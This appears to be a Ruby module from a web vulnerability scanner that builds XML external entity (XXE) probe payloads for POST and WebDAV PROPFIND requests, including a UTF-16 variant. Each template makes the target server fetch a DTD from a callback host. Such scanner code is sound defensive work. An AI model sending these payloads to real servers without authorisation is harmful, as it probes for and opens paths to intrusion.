require 'erb'
require 'net/http'
require_relative 'string'

module ScannerExtensions
  module Helpers
    # XML templates, used as payloads for XXE detections
    module XmlTemplates
      TEMPLATES = [
        {
          template: ERB.new(
            <<-fin.margin
              |<?xml version="1.0"?>
              |<!DOCTYPE a SYSTEM "http://<%=dns%>/a.dtd"[
              |  <!ENTITY % b SYSTEM "http://<%=dns%>/b.ent">
              |  %b;
              |]>
              |<a>wlrm-scnr</a>
            fin
          ),
          request_class: Net::HTTP::Post,
          method: :post
        },
        {
          template: ERB.new(
            <<-fin.margin
              |<?xml version="1.0"?>
              |<!DOCTYPE a PUBLIC "-//Textuality//TEXT Standard open-hatch boilerplate//EN" "http://<%=dns%>/a.dtd">
              |<a>wlrm-scnr</a>
            fin
          ),
          request_class: Net::HTTP::Post,
          method: :post
        }
      ].freeze
      WEBDAV_TEMPLATES = [{
        template: ERB.new(
          <<-fin.margin
            |<?xml version="1.0" encoding="utf-8"?>
            |<!DOCTYPE wlrm [
            |<!ENTITY % dtd SYSTEM "http://<%=dns%>/">
            |%dtd;]>
            |<propfind xmlns="DAV:"><allprop/></propfind>
          fin
        ),
        request_class: Net::HTTP::Propfind,
        method: :propfind
      }].freeze

      module_function

      def each(&block)
        TEMPLATES.each &block
      end

      def fill(template, dns)
        template[:template].result(Kernel.binding)
      end

      def fill16(template, dns)
        r = template[:template].result(Kernel.binding)
        data = r.split("\n")
        data[0] = '<?xml version="1.0" encoding="utf-16"?>'
        data = data.join("\n")
        data.encode('utf-16').unpack('C*')[0..-1].pack('C*')
      end
    end
  end
end
